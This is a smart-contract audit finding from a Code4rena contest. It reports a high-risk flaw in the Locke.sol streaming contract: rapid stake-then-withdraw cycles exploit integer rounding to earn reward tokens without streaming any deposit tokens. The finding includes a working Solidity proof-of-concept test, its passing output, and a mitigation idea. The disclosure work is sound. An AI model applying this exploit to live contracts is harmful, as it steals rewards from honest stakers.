## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Creating rewardTokens without streaming depositTokens](https://github.com/code-423n4/2021-11-streaming-findings/issues/166) 

# Handle

bitbopper


# Vulnerability details

## Impact

`stake` and `withdraws` can generate rewardTokens without streaming depositTokens. 
It does not matter whether the stream is a sale or not.

The following lines can increase the reward balance on a `withdraw` some time after `stake`:
https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222
```
// accumulate reward per token info
cumulativeRewardPerToken = rewardPerToken();

// update user rewards
ts.rewards = earned(ts, cumulativeRewardPerToken);
```


While the following line can be gamed in order to not stream any tokens (same withdraw tx). 
Specifically an attacker can arrange to create a fraction less than zero thereby substracting zero.
https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229
```
ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
// WARDEN TRANSLATION: (elapsedSecondsSinceStake * stakeAmount) / (endStreamTimestamp - stakeTimestamp)
```

A succesful attack increases the share of rewardTokens of the attacker.
The attack can be repeated every block increasing the share further.
The attack could be done from multiple EOA increasing the share further.
In short: Attackers can create loss of funds for (honest) stakers.

The economic feasability of the attack depends on:
- staked amount (times number of attacks) vs total staked amount
- relative value of rewardToken to gasprice 


## Proof of Concept

### code 

The following was added to `Locke.t.sol` for the `StreamTest` Contract to simulate the attack from one EOA.

```
    function test_quickDepositAndWithdraw() public {
        //// SETUP
        // accounting (to proof attack): save the rewardBalance of alice.
        uint StartBalanceA = testTokenA.balanceOf(address(alice));
        uint112 stakeAmount = 10_000;

        // start stream and fill it
        (
            uint32 maxDepositLockDuration,
            uint32 maxRewardLockDuration,
            uint32 maxStreamDuration,
            uint32 minStreamDuration
        ) = defaultStreamFactory.streamParams();

        uint64 nextStream = defaultStreamFactory.currStreamId();
        Stream stream = defaultStreamFactory.createStream(
            address(testTokenA),
            address(testTokenB),
            uint32(block.timestamp + 10), 
            maxStreamDuration,
            maxDepositLockDuration,
            0,
            false
            // false,
            // bytes32(0)
        );
        
        testTokenA.approve(address(stream), type(uint256).max);
        stream.fundStream(1_000_000_000);

        // wait till the stream starts
        hevm.warp(block.timestamp + 16);
        hevm.roll(block.number + 1);

        // just interact with contract to fill "lastUpdate" and "ts.lastUpdate" 
	// without changing balances inside of Streaming contract
        alice.doStake(stream, address(testTokenB), stakeAmount);
        alice.doWithdraw(stream, stakeAmount);


        ///// ATTACK COMES HERE
        // stake
        alice.doStake(stream, address(testTokenB), stakeAmount);

        // wait a block
        hevm.roll(block.number + 1);
        hevm.warp(block.timestamp + 16);

        // withdraw soon thereafter
        alice.doWithdraw(stream, stakeAmount);

        // finish the stream
        hevm.roll(block.number + 9999);
        hevm.warp(block.timestamp + maxDepositLockDuration);

        // get reward
        alice.doClaimReward(stream);
 

        // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken
        uint EndBalanceA = testTokenA.balanceOf(address(alice));
        uint EndBalanceB = testTokenB.balanceOf(address(alice));

        // Stream returned everything we gave it
        // (doStake sets balance of alice out of thin air => we compare end balance against our (thin air) balance)
        assert(stakeAmount == EndBalanceB);

        // we gained reward token without risk
        assert(StartBalanceA == 0);
        assert(StartBalanceA < EndBalanceA);
        emit log_named_uint("alice gained", EndBalanceA);
    }
```

### commandline

```
dapp test --verbosity=2 --match "test_quickDepositAndWithdraw" 2> /dev/null
Running 1 tests for src/test/Locke.t.sol:StreamTest
[PASS] test_quickDepositAndWithdraw() (gas: 4501209)

Success: test_quickDepositAndWithdraw

  alice gained: 13227
```

## Tools Used

dapptools

## Recommended Mitigation Steps
Ensure staked tokens can not generate reward tokens without streaming deposit tokens. First idea that comes to mind is making following line
`https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L220`
dependable on a positive amount > 0 of:
`https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229`

